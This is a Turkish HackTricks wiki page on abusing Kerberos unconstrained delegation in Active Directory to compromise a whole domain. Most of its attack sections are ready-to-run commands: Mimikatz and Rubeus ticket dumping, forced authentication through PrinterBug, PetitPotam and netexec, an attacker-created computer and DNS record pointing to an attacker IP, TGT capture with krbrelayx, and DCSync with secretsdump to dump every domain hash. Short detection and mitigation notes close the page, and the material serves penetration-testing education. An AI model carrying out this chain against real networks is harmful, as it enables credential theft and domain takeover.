# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Bu, Domain Administrator'ın domain içindeki herhangi bir **Computer** için etkinleştirebileceği bir özelliktir. Bundan sonra, bir **user** bu Computer'da **oturum açtığında**, kullanıcının **TGT'sinin bir kopyası** DC tarafından sağlanan **TGS'nin içine gönderilir** ve **LSASS belleğine kaydedilir**. Dolayısıyla makinede Administrator ayrıcalıklarına sahipseniz, **ticket'ları dump edebilir ve kullanıcıları** herhangi bir makinede **taklit edebilirsiniz**.

Yani "Unconstrained Delegation" özelliği etkinleştirilmiş bir Computer'da bir domain admin oturum açarsa ve bu makinede local admin ayrıcalıklarına sahipseniz, ticket'ı dump edip Domain Admin'i istediğiniz yerde taklit edebilirsiniz (domain privesc).

[**userAccountControl**](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) niteliğinin [**ADS_UF_TRUSTED_FOR_DELEGATION**](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) içerip içermediğini kontrol ederek bu niteliğe sahip **Computer** nesnelerini **bulabilirsiniz**. Bunu ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ LDAP filtresiyle yapabilirsiniz; powerview de bunu kullanır:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Administrator'ın (veya kurban kullanıcının) ticket'ını **Mimikatz** ya da [**Pass the Ticket**](pass-the-ticket.md) için **Rubeus kullanarak** belleğe yükleyin.\
Daha fazla bilgi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**ired.team'de Unconstrained delegation hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Kimlik Doğrulamayı Zorlama**

Bir saldırgan **"Unconstrained Delegation" için izin verilen bir bilgisayarı ele geçirebilirse**, bir **Print server'ı kandırarak** sunucu belleğine bir TGT kaydedip bu sunucuya karşı **otomatik olarak oturum açmasını** sağlayabilir.\
Ardından saldırgan, Print server bilgisayar hesabının kimliğine bürünmek için **Pass the Ticket saldırısı** gerçekleştirebilir.

Bir print server'ın herhangi bir makineye karşı oturum açmasını sağlamak için [**SpoolSample**](https://github.com/leechristensen/SpoolSample) kullanabilirsiniz:

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

TGT bir domain controller'dan geliyorsa, [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) gerçekleştirebilir ve DC'deki tüm hash'leri elde edebilirsiniz.\
[**Bu attack hakkında daha fazla bilgi için ired.team'e bakın.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

**Bir kimlik doğrulamayı zorlamanın** diğer yollarını burada bulabilirsiniz:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Kurbanın **Kerberos** ile unconstrained-delegation host'unuzda kimlik doğrulaması yapmasını sağlayan diğer tüm coercion primitive'ler de işe yarar. Modern ortamlarda bu, hangi RPC yüzeyine erişilebildiğine bağlı olarak klasik PrinterBug akışını genellikle **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** veya **WebClient/WebDAV** tabanlı coercion ile değiştirmek anlamına gelir.

### Unconstrained delegation ile bir user/service account'u kötüye kullanma

Unconstrained delegation **yalnızca computer object'lerle sınırlı değildir**. Bir **user/service account** da `TRUSTED_FOR_DELEGATION` olarak yapılandırılabilir. Bu senaryoda pratik gereklilik, hesabın sahip olduğu bir **SPN** için Kerberos service ticket'ları almasıdır.

Bu, çok yaygın 2 saldırı yolunu ortaya çıkarır:

1. Unconstrained-delegation **user account**'unun parolasını/hash'ini ele geçirir, ardından aynı hesaba **bir SPN eklersiniz**.
2. Hesabın zaten bir veya daha fazla SPN'si vardır, ancak bunlardan biri **artık kullanılmayan veya devre dışı bırakılmış bir hostname'e** işaret eder; eksik **DNS A record**'unu yeniden oluşturmak, SPN kümesini değiştirmeden kimlik doğrulama akışını ele geçirmek için yeterlidir.<sup>[[8]](#references)</sup>

Asgari Linux akışı:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Notlar:

- Bu, özellikle unconstrained principal bir **service account** olduğunda ve yalnızca kimlik bilgilerine sahip olup domain'e katılmış bir host üzerinde code execution elde edemediğinizde kullanışlıdır.
- Hedef kullanıcıda zaten bir **stale SPN** varsa, ilgili **DNS record**'u yeniden oluşturmak AD'ye yeni bir SPN yazmaktan daha az dikkat çekici olabilir.
- Linux odaklı güncel tradecraft; `addspn.py`, `dnstool.py`, `krbrelayx.py` ve bir coercion primitive kullanır. Zinciri tamamlamak için bir Windows host'a dokunmanız gerekmez.

### Saldırganın oluşturduğu bir computer ile Unconstrained Delegation'ı kötüye kullanma

Modern domain'lerde genellikle `MachineAccountQuota > 0` bulunur (varsayılan 10); bu, kimliği doğrulanmış herhangi bir principal'ın en fazla N computer object oluşturmasına olanak tanır. Ayrıca `SeEnableDelegationPrivilege` token privilege'ına (veya eşdeğer haklara) sahipseniz, yeni oluşturduğunuz computer'ı unconstrained delegation için trusted olacak şekilde ayarlayabilir ve ayrıcalıklı sistemlerden gelen TGT'leri ele geçirebilirsiniz.<sup>[[1]](#references)</sup>

Üst düzey akış:

1) Kontrolünüzde olan bir computer oluşturun

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Sahte hostname'in etki alanı içinde çözümlenebilir olmasını sağlayın

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Saldırganın kontrolündeki bilgisayarda Unconstrained Delegation'ı etkinleştir

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Neden işe yarar: unconstrained delegation ile delegation etkin bir bilgisayardaki LSA, gelen TGT'leri önbelleğe alır. Bir DC'yi veya ayrıcalıklı bir sunucuyu sahte host'unuza kimlik doğrulaması yapması için kandırırsanız, makine TGT'si depolanır ve dışa aktarılabilir.

4) krbrelayx'i export modunda başlatın ve Kerberos materyalini hazırlayın

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) DC'yi/sunucuları sahte hostunuza kimlik doğrulaması yapmaya zorlayın

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx, bir makine kimlik doğrulaması yaptığında ccache dosyalarını kaydeder. Örneğin:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) DCSync gerçekleştirmek için ele geçirilen DC makinesinin TGT'sini kullanın.

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Notlar ve gereksinimler:

- `MachineAccountQuota > 0`, ayrıcalıksız kullanıcıların computer oluşturmasına olanak tanır; aksi durumda açıkça verilmiş haklara ihtiyacınız vardır.
- Bir computer üzerinde `TRUSTED_FOR_DELEGATION` ayarlamak için `SeEnableDelegationPrivilege` (veya domain admin) gerekir.
- DC'nin FQDN üzerinden fake host'unuza erişebilmesi için ad çözümlemesinin (DNS A kaydı) doğru olduğundan emin olun.
- Coercion için kullanılabilir bir vektör gerekir (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN vb.). Mümkünse bunları DC'lerde devre dışı bırakın.
- Victim hesabı **"Account is sensitive and cannot be delegated"** olarak işaretlenmişse veya **Protected Users** üyesiyse, iletilen TGT service ticket'e eklenmez; bu nedenle bu zincir yeniden kullanılabilir bir TGT sağlamaz.<sup>[[9]](#references)</sup>
- Kimlik doğrulaması yapan client/server üzerinde **Credential Guard** etkinse, Windows **Kerberos unconstrained delegation** özelliğini engeller. Bu durum, operatör açısından geçerli görünen coercion yollarının başarısız olmasına neden olabilir.

Tespit ve hardening fikirleri:

- UAC `TRUSTED_FOR_DELEGATION` ayarlandığında Event ID 4741 (computer hesabı oluşturuldu) ve 4742/4738 (computer/user hesabı değiştirildi) için uyarı oluşturun.
- Domain zone içinde olağandışı DNS A kaydı eklemelerini izleyin.
- Beklenmeyen host'lardan gelen 4768/4769 olaylarındaki artışları ve DC'lerin DC olmayan host'larda kimlik doğrulaması yapmasını izleyin.
- `SeEnableDelegationPrivilege` yetkisini mümkün olan en az sayıda kullanıcıya verin, mümkün olduğunda `MachineAccountQuota=0` olarak ayarlayın ve DC'lerde Print Spooler'ı devre dışı bırakın. LDAP signing ve channel binding uygulayın.

### Mitigation

- DA/Admin oturum açma işlemlerini belirli servislerle sınırlandırın.
- Ayrıcalıklı hesaplarda "Account is sensitive and cannot be delegated" seçeneğini ayarlayın.

## References

- [1] [HTB: Delegate — SYSVOL kimlik bilgileri → Targeted Kerberoast → Unconstrained Delegation → DA için DCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Kısıtlanmamış delegation üzerinden domain'in ele geçirilmesi](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Active Directory'de Unconstrained Delegation](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – DC print server ve Kerberos delegation üzerinden domain'in ele geçirilmesi](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
